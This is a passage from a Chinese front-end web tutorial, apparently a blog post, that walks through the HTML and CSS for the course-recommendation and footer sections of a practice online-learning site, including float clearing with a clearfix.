    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"goods w"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>精品推荐<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
         
            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>jQuery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Spark<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>MySQL<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>JavaWeb<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>MyAQL<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>JavaWeb<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span><span class="hljs-attr">class</span>=<span class="hljs-string">"mod"</span>&gt;</span>修改兴趣<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!--3. 精品推荐模块结束--&gt;</span>
</code></pre>
<h4 data-id="heading-26">样式代码</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 精品推荐模块 */</span>
<span class="hljs-selector-class">.goods</span>{
<span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
<span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">3px</span> <span class="hljs-number">3px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
<span class="hljs-comment">/* 行高会继承 */</span>
<span class="hljs-attribute">line-height</span>: <span class="hljs-number">60px</span>;
}

<span class="hljs-selector-class">.goods</span> <span class="hljs-selector-tag">h3</span>{
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">30px</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00a4ff</span>;
}

<span class="hljs-selector-class">.goods</span> <span class="hljs-selector-tag">ul</span>{
    <span class="hljs-attribute">float</span>: left;
    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">30px</span>;
}

<span class="hljs-selector-class">.goods</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span>{
<span class="hljs-attribute">float</span>: left;
   
}

<span class="hljs-selector-class">.goods</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span>{

        <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">30px</span>;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
        <span class="hljs-attribute">color</span>: <span class="hljs-number">#050505</span>;
        <span class="hljs-attribute">border-left</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;
}

<span class="hljs-selector-class">.mod</span>{
    <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;
    <span class="hljs-attribute">margin-right</span>:<span class="hljs-number">30px</span> ;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00a4ff</span>;
}
</code></pre>
<h4 data-id="heading-27">精品推荐小模块效果图</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a41531d743d4ea1ae3511e84904eaaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=CcnT14YwgPf2jEkmDO0jzO7ew2w%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-28">3.4精品推荐大模块</h3>
<h4 data-id="heading-29">思路</h4>
<p>1号盒子为最大盒子，box版心水平居中；<br/>
2号盒子为上面部分，box-hd--里面左侧标题h3左浮动，右侧链接a右浮动；<br/>
3号盒子为底下部分，box-bd--里面是无序列表，有10小li组成；<br/>
小li外边距的问题，这里有个小技巧：给box-hd宽度为1215就可以一行装开5个li<br/>
另外，Ctrl+g 输入1，到第一行，给body加一个高度，便于滑动，后面再删掉</p>
<h5 data-id="heading-30">具体注意事项：</h5>
<p>把li的父亲ul修改的足够宽，一行能装开5个盒子就不会换行了
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d69f5a5999d4ebb93c945044a3b9631~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=apOoGbwFAU1UJYkn0%2FAX6U%2BTMG4%3D" alt="image.png" loading="lazy"/></p>
<p>设置好一个盒子以后，再删掉其他li，复制粘贴第一个li，再修改内容和图片</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e37505f3c734e0aa14dada491ef47d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=fnn2QNhiRwG9O6%2B758yBMkIaNMA%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-31">代码实现</h4>
<h5 data-id="heading-32">结构代码</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 4.box核心内容其余开始 --&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box w"</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box-hd"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>精品推荐<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>查看全部<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box-bd"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                 <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>  ·  1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/pic.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Think PHP 5.0 博客系统实战项目演练<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>高级<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> · 1125人在学<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 4.box核心内容其余结束--&gt;</span>
   
</code></pre>
<h5 data-id="heading-33">样式代码</h5>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 精品推荐大模块 */</span>
<span class="hljs-comment">/* box-hd部分 */</span>
<span class="hljs-selector-class">.box</span>{
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;
}

<span class="hljs-selector-class">.box-hd</span>{
    <span class="hljs-attribute">height</span>: <span class="hljs-number">45px</span>;
}

<span class="hljs-selector-class">.box-hd</span> <span class="hljs-selector-tag">h3</span>{
<span class="hljs-attribute">float</span>: left;
<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
<span class="hljs-attribute">color</span>:<span class="hljs-number">#494949</span>
}

<span class="hljs-selector-class">.box-hd</span> <span class="hljs-selector-tag">a</span>{
    <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#a5a5a5</span>;
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">30px</span>;
}

<span class="hljs-comment">/* box-bd */</span>
<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-tag">a</span>{
    <span class="hljs-attribute">float</span>: right;
    <span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#a5a5a5</span>;
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">30px</span>;
}
<span class="hljs-comment">/* 把li的父亲ul修改的足够宽，一行能装开5个盒子就不会换行了 */</span>
<span class="hljs-selector-class">.box-bd</span>{
    <span class="hljs-attribute">width</span>: <span class="hljs-number">1215px</span>;
}

<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span>{
    <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">228px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">270px</span>;
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;
    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
}

<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">img</span>{
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
}

<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">h4</span>{
<span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span> <span class="hljs-number">20px</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span>;
<span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
<span class="hljs-attribute">color</span>: <span class="hljs-number">#050505</span>;
<span class="hljs-attribute">font-weight</span>: <span class="hljs-number">400</span>;
}

<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-class">.info</span>{
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-number">25px</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#999</span>
}

<span class="hljs-selector-class">.box-bd</span> <span class="hljs-selector-class">.info</span> <span class="hljs-selector-tag">span</span>{
    <span class="hljs-attribute">color</span>:<span class="hljs-number">#ff7c2d</span>;
}
</code></pre>
<h4 data-id="heading-34">效果图（未修改成不同内容版）</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc113ae1f80f4847a2b2316c3fe2c8cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=TJ0gppYPugsItuwniAHA6ba25tQ%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-35">3.5底部模块</h3>
<h4 data-id="heading-36">思路</h4>
<p>1号盒子是通栏大盒子，底部footer给高度，底色是白色<br/>
2号盒子版心水平居中<br/>
3号盒子版权copyright左对齐<br/>
4号盒子链接links右对齐</p>
<h4 data-id="heading-37">所遇问题</h4>
<p>为便于观察，先用粉色背景，由于浮动不占空间，粉色大盒子不在预想位置，如下图，此时需在li的父亲ul去浮动
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e52bca5009bd44beba34876a39bfc998~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=a3M3%2FYcoybrG9PXZBUuLnZypzyY%3D" alt="image.png" loading="lazy"/>
去浮动代码（清除浮动之双伪元素清除）</p>
<p>样式代码添加</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:before</span>,
 <span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> {
     <span class="hljs-attribute">content</span>: <span class="hljs-string">""</span>;
     <span class="hljs-attribute">display</span>: table;
 }

 <span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> {
     <span class="hljs-attribute">clear</span>: both;
 }

 <span class="hljs-selector-class">.clearfix</span> {
     zoom: <span class="hljs-number">1</span>;
 } 
</code></pre>
<p>在结构代码的ul加上clearfix的类名</p>
<pre><code class="hljs language-ini" lang="ini">  &lt;ul <span class="hljs-attr">class</span>=<span class="hljs-string">"clearfix "</span>&gt;
</code></pre>
<p>去浮动以后，效果图如下
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed14ee8882004f84b3aa636f8d6dac1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=6gvEMZKmV4oXiq2mX7u5CH6jlis%3D" alt="image.png" loading="lazy"/></p>
<p>用外上边距会出现塌陷，如图所示</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f01149705cd647e9b61001976191beb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=0YClHas2Oli1wm4TCTLavgV2VGg%3D" alt="image.png" loading="lazy"/>
要用内边距</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.footer</span> <span class="hljs-selector-class">.w</span>{
    <span class="hljs-comment">/* 不要用外边距 */</span>
    <span class="hljs-comment">/* margin-top: 35px; */</span>
    <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">35px</span>;
}

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4912df0e1283428eb74d1197fab1f7f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57OW57OWVEFORw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771502848&amp;x-signature=wRWkEQXPKFBmtmxVO%2BOyQZbUrqM%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-38">代码实现</h4>
<h5 data-id="heading-39">结构代码</h5>
<pre><code class="hljs language-xml" lang="xml"> <span class="hljs-comment">&lt;!-- 5.footer底部模块开始 --&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"footer"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"copyright"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"images/logo.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>学成在线致力于普及中国最好的教育它与中国一流大学和机构合作提供在线课程。<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
               © 2017年XTCG Inc.保留所有权力。-沪ICP备15025210号<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

               <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app"</span>&gt;</span>下载APP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"links"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>关于学成网<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>关于<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>管理团队<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>工作机会<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>客户服务<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>
